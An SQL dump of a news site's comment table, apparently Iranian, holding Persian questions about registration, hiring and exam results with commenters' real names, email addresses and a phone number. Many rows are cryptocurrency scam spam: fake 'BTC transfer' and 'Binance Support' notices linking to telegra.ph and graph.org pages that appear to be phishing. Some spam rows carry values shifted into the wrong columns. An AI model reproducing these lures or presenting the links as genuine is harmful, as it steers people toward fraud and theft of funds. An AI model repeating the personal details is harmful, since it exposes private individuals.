INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88485, 62277, 'حسن عبیداوی', 'obeidavi2016@gmail.com', 'ثبت نام دارایی مدرک تحصیلی دیپلم ', 0, '2025-02-19 22:33:03', '1403/12/1', '10:33:03 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88486, 62277, 'حسن عبیداوی', 'obeidavi2016@gmail.com', 'ثبت نام دارایی مدرک تحصیلی دیپلم ', 0, '2025-02-19 22:33:04', '1403/12/1', '10:33:04 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88487, 51185, 'محمد حسین اسکندری', 'hosseineskandari1390@gmail.com', 'راننده نیمه سنگین
فرزند جانباز ۵۵ درصد
متاهل داری یک فرزند', 0, '2025-02-20 12:55:21', '1403/12/2', '12:55:21 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88488, 51185, 'محمد حسین اسکندری', 'hosseineskandari1390@gmail.com', 'راننده نیمه سنگین
فرزند جانباز ۵۵ درصد
متاهل داری یک فرزند', 0, '2025-02-20 12:55:44', '1403/12/2', '12:55:44 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88489, 51185, 'محمد حسین اسکندری', 'hosseineskandari1390@gmail.com', 'راننده نیمه سنگین پایه دو
فرزند جانباز ۵۵ درصد
متاهل دارای یک فرزند', 0, '2025-02-20 13:03:05', '1403/12/2', '1:03:05 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88490, 62277, 'مهدی زبیدی', 'adnanzobeidi@gmail.com', 'مامور قرائت', 0, '2025-02-20 21:54:10', '1403/12/2', '9:54:10 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88491, 62273, '📆 Notification: TRANSFER 0,75577055 bitcoin. Go to withdrawal >>> https://telegra.ph/Binance-Suppor', 'friedenspfeifen@omggreatfoods.com', 'os04bk', 0, '2025-02-21 01:15:36', '1403/12/3', '1:15:36 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88492, 62275, '📩 + 0.75588761 BTC.GET - https://telegra.ph/Binance-Support-02-18?hs=21072e006f87ebeed258fbce72d63a', 'friedenspfeifen@omggreatfoods.com', 'yrb3ss', 0, '2025-02-21 01:15:37', '1403/12/3', '1:15:37 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88494, 62277, '📐 Email: Process NoAY11. VERIFY =>> https://telegra.ph/Binance-Support-02-18?hs=ca98e61f07db0f27baa', 'friedenspfeifen@omggreatfoods.com', 'quoboh', 0, '2025-02-21 01:15:45', '1403/12/3', '1:15:45 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88495, 62277, 'آرش زبیدی', 'Arshzbydy14@gmail.com', 'نیرو', 0, '2025-02-24 14:43:02', '1403/12/6', '2:43:02 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88496, 60238, 'سجاد منجزی', 'sajadmonjezi85@gmail.com', 'خوب', 0, '2025-02-25 13:45:30', '1403/12/7', '1:45:30 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88497, 51185, 'مهدی زبیدی', 'adnanzobeidi@gmail.com', 'استخدام شرکت برق', 0, '2025-02-28 21:09:41', '1403/12/10', '9:09:41 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88498, 51185, 'مهدی زبیدی', 'adnanzobeidi@gmail.com', 'استخدام شرکت برق', 0, '2025-02-28 21:09:58', '1403/12/10', '9:09:58 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88499, 51185, 'مهدی زبیدی', 'adnanzobeidi@gmail.com', 'استخدام شرکت برق', 0, '2025-02-28 21:10:50', '1403/12/10', '9:10:50 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88500, 51185, 'مهدی زبیدی', 'adnanzobeidi@gmail.com', 'استخدام شرکت برق', 0, '2025-02-28 21:12:18', '1403/12/10', '9:12:18 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88501, 51185, 'مهدی زبیدی', 'adnanzobeidi@gmail.com', 'استخدام شرکت برق', 0, '2025-02-28 21:12:19', '1403/12/10', '9:12:19 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88502, 51185, 'مهدی زبیدی', 'adnanzobeidi@gmail.com', 'استخدام شرکت برق', 0, '2025-02-28 21:12:22', '1403/12/10', '9:12:22 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88503, 51185, 'مهدی زبیدی', 'adnanzobeidi@gmail.com', 'استخدام شرکت برق', 0, '2025-02-28 21:12:24', '1403/12/10', '9:12:24 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88504, 51185, 'مهدی زبیدی', 'adnanzobeidi@gmail.com', 'استخدام شرکت برق', 0, '2025-02-28 21:12:27', '1403/12/10', '9:12:27 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88505, 51185, 'مهدی زبیدی', 'adnanzobeidi@gmail.com', 'استخدام شرکت برق', 0, '2025-02-28 21:12:27', '1403/12/10', '9:12:27 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88506, 51185, 'مهدی زبیدی', 'adnanzobeidi@gmail.com', 'استخدام شرکت برق', 0, '2025-02-28 21:12:27', '1403/12/10', '9:12:27 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88507, 51185, 'مهدی زبیدی', 'adnanzobeidi@gmail.com', 'استخدام شرکت برق', 0, '2025-02-28 21:12:28', '1403/12/10', '9:12:28 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88508, 51185, 'مهدی زبیدی', 'adnanzobeidi@gmail.com', 'استخدام شرکت برق', 0, '2025-02-28 21:12:28', '1403/12/10', '9:12:28 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88509, 51185, 'مهدی زبیدی', 'adnanzobeidi@gmail.com', 'استخدام شرکت برق', 0, '2025-02-28 21:12:30', '1403/12/10', '9:12:30 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88510, 62282, 'کی', 'Play.one.ther.one@gmail.com', 'نه اطلاعیه درستی نه سایتی ، نه
متوجه نشدیم کی آزمون برگزار شد

هروقت مراجعه کردیم ', 0, '2025-03-01 15:31:22', '1403/12/11', '3:31:22 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88511, 62280, '🛎 Message- + 0.7544993 BTC. Receive => https://graph.org/GET-BITCOIN-TRANSFER-02-23-2?hs=1ff2d6d096', 'ajvazovaskijo@gomigoofficial.com', 'nwzeki', 0, '2025-03-02 04:14:00', '1403/12/12', '4:14:00 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88512, 62282, '🗓 Sending a transfer from our company. Continue =>> https://graph.org/GET-BITCOIN-TRANSFER-02-23-2?', 'ajvazovaskijo@gomigoofficial.com', 'i7m9os', 0, '2025-03-02 04:14:24', '1403/12/12', '4:14:24 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88514, 62282, 'Omidnazari', 'omidnazari4143@gmail.com', 'درود و خسته نباشید 
آزمون بسیار عالی و در فضای خیلی خوب برگزار شد از تموم اساتید حرفه و کاربلد هم تشکر فراوان دارم به امید موفقیت برای هم دوستان .', 0, '2025-03-03 15:13:24', '1403/12/13', '3:13:24 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88515, 62276, 'محمد حمیدزاده', 'mohammadlove085@gmail.com', 'نتایج آزمون رو ازکجا مشاهد کنیم ', 0, '2025-03-07 12:15:02', '1403/12/17', '12:15:02 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88516, 62276, 'محمد رحیمی لرکی', 'mohammadrahimilarki92@gmail.com', 'با سلام لطفا تاریخ اعلام نتایج آزمون را درخواست داشتم.با تشکر', 0, '2025-03-09 09:34:10', '1403/12/19', '9:34:10 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88517, 59212, 'محسن تنگسیری', 'mohsenytk@gmail.com', 'زرای ثبت نام دسترسی به سایت را آسان نمایید. باتشکر ', 0, '2025-03-12 08:07:40', '1403/12/22', '8:07:40 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88518, 59212, 'محسن تنگسیری', 'mohsenytk@gmail.com', 'برای ثبت نام دسترسی به سایت را آسان نمایید. باتشکر ', 0, '2025-03-12 08:07:51', '1403/12/22', '8:07:51 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88519, 59212, 'محسن تنگسیری', 'mohsenytk@gmail.com', 'برای ثبت نام دسترسی به سایت را آسان نمایید. باتشکر ', 0, '2025-03-12 08:07:52', '1403/12/22', '8:07:52 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88520, 59212, 'محسن تنگسیری', 'mohsenytk@gmail.com', 'برای ثبت نام دسترسی به سایت را آسان نمایید. باتشکر ', 0, '2025-03-12 08:07:52', '1403/12/22', '8:07:52 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88521, 59212, 'محسن تنگسیری', 'mohsenytk@gmail.com', 'برای ثبت نام دسترسی به سایت را آسان نمایید. باتشکر ', 0, '2025-03-12 08:07:53', '1403/12/22', '8:07:53 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88522, 59212, 'محسن تنگسیری', 'mohsenytk@gmail.com', 'برای ثبت نام دسترسی به سایت را آسان نمایید. باتشکر ', 0, '2025-03-12 08:07:53', '1403/12/22', '8:07:53 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88523, 59212, 'محسن تنگسیری', 'mohsenytk@gmail.com', 'برای ثبت نام دسترسی به سایت را آسان نمایید. باتشکر ', 0, '2025-03-12 08:07:53', '1403/12/22', '8:07:53 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88524, 59212, 'محسن تنگسیری', 'mohsenytk@gmail.com', 'برای ثبت نام دسترسی به سایت را آسان نمایید. باتشکر ', 0, '2025-03-12 08:07:53', '1403/12/22', '8:07:53 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88525, 59212, 'محسن تنگسیری', 'mohsenytk@gmail.com', 'برای ثبت نام دسترسی به سایت را آسان نمایید. باتشکر ', 0, '2025-03-12 08:07:55', '1403/12/22', '8:07:55 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88526, 59212, 'محسن تنگسیری', 'mohsenytk@gmail.com', 'برای ثبت نام دسترسی به سایت را آسان نمایید. باتشکر ', 0, '2025-03-12 08:07:56', '1403/12/22', '8:07:56 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88527, 59212, 'محسن تنگسیری', 'mohsenytk@gmail.com', 'سایت از بخش صلاحیت حرفه ای مدرسان باز نمی شود.
با تشکر', 0, '2025-03-13 13:57:27', '1403/12/23', '1:57:27 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88528, 62282, '📉 + 0.75796972 BTC.NEXT - https://graph.org/GET-BITCOIN-TRANSFER-02-23-2?hs=7773914da63c19b48ce65a8', 'marwanb91@code-gmail.com', 'oshflt', 0, '2025-03-13 16:00:58', '1403/12/23', '4:00:58 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88529, 62283, '🔌 You have 1 notification № 444296. Open >> https://graph.org/GET-BITCOIN-TRANSFER-02-23-2?hs=296ca', 'marwanb91@code-gmail.com', 'oy0ouq', 0, '2025-03-13 16:01:00', '1403/12/23', '4:01:00 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88530, 62284, '📌 Sending a transfer from user. Get >>> https://graph.org/GET-BITCOIN-TRANSFER-02-23-2?hs=660120879', 'marwanb91@code-gmail.com', '8wza8f', 0, '2025-03-13 16:01:02', '1403/12/23', '4:01:02 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88531, 62285, '🖋 Email: TRANSFER 0.75775917 bitcoin. GET => https://graph.org/GET-BITCOIN-TRANSFER-02-23-2?hs=eda4', 'marwanb91@code-gmail.com', '7bder9', 0, '2025-03-13 16:01:05', '1403/12/23', '4:01:05 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88532, 62282, '🗑 You have received 1 notification # 935921. Go >>> https://graph.org/GET-BITCOIN-TRANSFER-02-23-2?', 'avijagtap@dmxs8.com', 'pxn65d', 0, '2025-03-16 09:40:21', '1403/12/26', '9:40:21 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88533, 62283, '📍 You got a transfer from Binance. GET > https://graph.org/GET-BITCOIN-TRANSFER-02-23-2?hs=296ca04f', 'avijagtap@dmxs8.com', 'vnsva3', 0, '2025-03-16 09:40:23', '1403/12/26', '9:40:23 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88534, 62285, '🖨 Notification: Process NoQL39. CONFIRM =>> https://graph.org/GET-BITCOIN-TRANSFER-02-23-2?hs=eda4a', 'avijagtap@dmxs8.com', '1dku7n', 0, '2025-03-16 09:40:47', '1403/12/26', '9:40:47 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88535, 62282, '📀 You have a notification № 627527. Open > https://graph.org/GET-BITCOIN-TRANSFER-02-23-2?hs=777391', 'aurorabnkwy@gmailbrt.com', '8wr8qj', 0, '2025-03-19 15:59:21', '1403/12/29', '3:59:21 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88536, 62283, '🔑 Notification- TRANSACTION 0,75301831 BTC. Next >> https://graph.org/GET-BITCOIN-TRANSFER-02-23-2?', 'aurorabnkwy@gmailbrt.com', 'qn6hce', 0, '2025-03-19 15:59:23', '1403/12/29', '3:59:23 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88537, 62284, '📂 Sending a transfer from unknown user. GЕТ >> https://graph.org/GET-BITCOIN-TRANSFER-02-23-2?hs=66', 'aurorabnkwy@gmailbrt.com', 'yr5yo6', 0, '2025-03-19 15:59:26', '1403/12/29', '3:59:26 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88538, 62285, '📅 + 0.75767467 BTC.GET - https://graph.org/GET-BITCOIN-TRANSFER-02-23-2?hs=eda4acafd04456e9eadf9dca', 'aurorabnkwy@gmailbrt.com', 'wv3ozz', 0, '2025-03-19 15:59:28', '1403/12/29', '3:59:28 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88539, 53192, 'عقیل جبارزاده', 'ageelgbar05@gmail.com', 'جواب آزمون نیروی حجمی خدمات آب و برق خوزستان ', 0, '2025-03-21 20:03:59', '1404/1/1', '8:03:59 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88540, 53192, 'عقیل جبارزاده', 'ageelgbar05@gmail.com', 'جواب آزمون نیروی حجمی خدمات آب و برق خوزستان ', 0, '2025-03-21 20:04:04', '1404/1/1', '8:04:04 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88541, 53192, 'عقیل جبارزاده', 'ageelgbar05@gmail.com', 'جواب آزمون نیروی حجمی خدمات آب و برق خوزستان ', 0, '2025-03-21 20:04:13', '1404/1/1', '8:04:13 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88542, 53192, 'عقیل جبارزاده', 'ageelgbar05@gmail.com', 'جواب آزمون نیروی حجمی خدمات آب و برق خوزستان ', 0, '2025-03-21 20:04:16', '1404/1/1', '8:04:16 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88543, 62282, '📎 Email: Transaction NoHZ95. GET >>> https://telegra.ph/Binance-Support-02-18?hs=7773914da63c19b48c', 'roofa2000@automisly.org', '574xsu', 0, '2025-03-22 11:37:35', '1404/1/2', '11:37:35 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88544, 62283, '📅 Message- You got a transfer #PQ99. GET =>> https://telegra.ph/Binance-Support-02-18?hs=296ca04f37', 'roofa2000@automisly.org', 'opglag', 0, '2025-03-22 11:37:38', '1404/1/2', '11:37:38 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88545, 62285, '🖇 + 0.75347027 BTC.NEXT - https://telegra.ph/Binance-Support-02-18?hs=eda4acafd04456e9eadf9dca93e54', 'roofa2000@automisly.org', '7rd6l6', 0, '2025-03-22 11:38:01', '1404/1/2', '11:38:01 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88546, 62282, '📁 Ticket; TRANSACTION 0.75343889 bitcoin. Get =>> https://telegra.ph/Binance-Support-02-18?hs=77739', 'azizxkill1@setxko.com', '2p3zib', 0, '2025-03-22 23:01:05', '1404/1/2', '11:01:05 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88547, 62283, '✒ You have a transaction from us. Get > https://telegra.ph/Binance-Support-02-18?hs=296ca04f37dc0b46', 'azizxkill1@setxko.com', 'r28egd', 0, '2025-03-22 23:01:07', '1404/1/2', '11:01:07 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88548, 62284, '🔒 + 0.7534972 BTC.NEXT - https://telegra.ph/Binance-Support-02-18?hs=66012087906eb13669fb32fad9ed34', 'azizxkill1@setxko.com', 't96w6v', 0, '2025-03-22 23:01:10', '1404/1/2', '11:01:10 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88549, 62285, '🔗 Sending a gift from unknown user. Next => https://telegra.ph/Binance-Support-02-18?hs=eda4acafd04', 'azizxkill1@setxko.com', '6qt5rh', 0, '2025-03-22 23:01:13', '1404/1/2', '11:01:13 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88550, 62282, '🔐 Connor', '10:27:16 PM', 'here\'\'s a summary of your BTC activity. https://graph.org/Message--04804-03-25?hs=7773914d', 0, '2022-01-01 00:00:00', '0', '1404/1/6');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88551, 62283, '🔐 Lily', '10:27:18 PM', 'your Bitcoin balance has been credited. https://graph.org/Message--04804-03-25?hs=296ca04f3', 0, '2022-01-01 00:00:00', '0', '1404/1/6');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88552, 62284, '🖇 Emma', '10:27:21 PM', 'your ₿3,66462 BTC is safely processed. https://graph.org/Message--04804-03-25?hs=6601208790', 0, '2022-01-01 00:00:00', '0', '1404/1/6');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88553, 62285, '🗝 Abigail', '10:27:23 PM', 'discover ways to manage your ₿2,721588 BTC. https://graph.org/Message--04804-03-25?hs=ed', 0, '2022-01-01 00:00:00', '0', '1404/1/6');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88554, 62282, '🛡 Message: TRANSFER 1.680096 BTC. GET > https://graph.org/Message--8529-03-25?hs=7773914da63c19b48c', 'andreiutenkov@twitch.work', 'ybon1s', 0, '2025-03-31 01:52:21', '1404/1/11', '1:52:21 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88555, 62283, '🛠 Email; Process 1,252415 BTC. Withdraw => https://graph.org/Message--8529-03-25?hs=296ca04f37dc0b4', 'andreiutenkov@twitch.work', 'uaw1bd', 0, '2025-03-31 01:52:25', '1404/1/11', '1:52:25 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88556, 62284, '📓 + 1.843789 BTC.NEXT - https://graph.org/Message--8529-03-25?hs=66012087906eb13669fb32fad9ed345c& ', 'andreiutenkov@twitch.work', '9vh68q', 0, '2025-03-31 01:52:27', '1404/1/11', '1:52:27 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88557, 62285, '🔈 Message; SENDING 1.647510 BTC. Next >> https://graph.org/Message--8529-03-25?hs=eda4acafd04456e9e', 'andreiutenkov@twitch.work', 'f0bmbw', 0, '2025-03-31 01:52:31', '1404/1/11', '1:52:31 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88558, 53192, 'حمید', 'www.hamidsaadi4@gmail.com', '09389093073', 0, '2025-04-05 20:44:23', '1404/1/16', '8:44:23 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88559, 53192, 'حمید', 'www.hamidsaadi4@gmail.com', '09389093073', 0, '2025-04-05 20:44:31', '1404/1/16', '8:44:31 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88560, 53192, 'حمید', 'www.hamidsaadi4@gmail.com', '09389093073', 0, '2025-04-05 20:44:41', '1404/1/16', '8:44:41 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88561, 62282, '🔧 + 1.429208 BTC.GET - https://graph.org/Message--05654-03-25?hs=7773914da63c19b48ce65a8b9ded8d66& ', 'hatty2001@murahpanel.com', 'nujgx0', 0, '2025-04-06 08:32:33', '1404/1/17', '8:32:33 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88562, 62283, '🔏 Notification; + 1.545924 bitcoin. Withdraw >>> https://graph.org/Message--05654-03-25?hs=296ca04f', 'hatty2001@murahpanel.com', '3pxaj5', 0, '2025-04-06 08:32:38', '1404/1/17', '8:32:38 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88563, 62284, '🔍 + 1.514090 BTC.NEXT - https://graph.org/Message--05654-03-25?hs=66012087906eb13669fb32fad9ed345c&', 'hatty2001@murahpanel.com', '9cn73y', 0, '2025-04-06 08:32:41', '1404/1/17', '8:32:41 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88564, 62285, '📻 Reminder; TRANSACTION 1,350193 bitcoin. Receive > https://graph.org/Message--05654-03-25?hs=eda4a', 'hatty2001@murahpanel.com', 'u24pj5', 0, '2025-04-06 08:32:45', '1404/1/17', '8:32:45 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88565, 62284, 'فاطمه اصغریان', 'fatemhasgharyan00@gmail.com', 'میخواهم در دوره آموزشی تولید برق از انرژی خورشیدی شرکت کنم شرایطش چیست؟ ', 0, '2025-04-08 13:20:40', '1404/1/19', '1:20:40 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88566, 62283, '🔗 + 1.672169 BTC.GET - https://graph.org/Message--685-03-25?hs=296ca04f37dc0b463f5e0dd21191d7fa& 🔗', 'azizxkill1@setxko.com', '8w3rs3', 0, '2025-04-16 16:19:01', '1404/1/27', '4:19:01 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88567, 62284, '🛡 + 1.138483 BTC.GET - https://graph.org/Message--685-03-25?hs=66012087906eb13669fb32fad9ed345c& 🛡', 'azizxkill1@setxko.com', 'gspg6w', 0, '2025-04-16 16:19:05', '1404/1/27', '4:19:05 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88568, 62285, '📝 + 1.286505 BTC.NEXT - https://graph.org/Message--685-03-25?hs=eda4acafd04456e9eadf9dca93e54236& �', 'azizxkill1@setxko.com', 'ex3yle', 0, '2025-04-16 16:19:08', '1404/1/27', '4:19:08 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88569, 62286, '🖲 + 1.465533 BTC.NEXT - https://graph.org/Message--685-03-25?hs=8fc6b9e53dca8022216646abc9bc2fa8& �', 'azizxkill1@setxko.com', 'eosn1s', 0, '2025-04-16 16:19:10', '1404/1/27', '4:19:10 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88570, 62283, '📇 + 1.434588 BTC.NEXT - https://graph.org/Message--04804-03-25?hs=296ca04f37dc0b463f5e0dd21191d7fa&', 'marwanb91@code-gmail.com', 'trbxij', 0, '2025-04-18 22:48:43', '1404/1/29', '10:48:43 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88571, 62284, '📣 Ticket: Operation 1,24336 BTC. GET =>> https://graph.org/Message--04804-03-25?hs=66012087906eb136', 'marwanb91@code-gmail.com', '216bpp', 0, '2025-04-18 22:48:47', '1404/1/29', '10:48:47 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88572, 62286, '🔗 + 1.645235 BTC.NEXT - https://graph.org/Message--04804-03-25?hs=8fc6b9e53dca8022216646abc9bc2fa8&', 'marwanb91@code-gmail.com', '16kofk', 0, '2025-04-18 22:49:10', '1404/1/29', '10:49:10 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88573, 62284, '🔓 Email: + 1,30241 BTC. GET =>> https://graph.org/Message--0484-03-25?hs=66012087906eb13669fb32fad9', 'avijagtap@dmxs8.com', 'bb2h08', 0, '2025-04-21 00:49:26', '1404/2/1', '12:49:26 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88574, 62285, '📉 Email: TRANSACTION 1,210887 BTC. Confirm => https://graph.org/Message--0484-03-25?hs=eda4acafd044', 'avijagtap@dmxs8.com', 'wux79m', 0, '2025-04-21 00:49:29', '1404/2/1', '12:49:29 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88575, 62286, '✂ Reminder; + 1,666944 BTC. Go to withdrawal >> https://graph.org/Message--0484-03-25?hs=8fc6b9e53dc', 'avijagtap@dmxs8.com', 'gmklz6', 0, '2025-04-21 00:49:33', '1404/2/1', '12:49:33 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88576, 62275, 'Parvin', 'Gigili.gingoli@gmail.com', 'جالبه که هنوز جوابشو ندادن ازمونو  مگه پروسه ی ازمون چقد طول میکشه تصحیح کردنش و اعلام نمراتش ', 0, '2025-04-21 20:41:23', '1404/2/1', '8:41:23 PM');
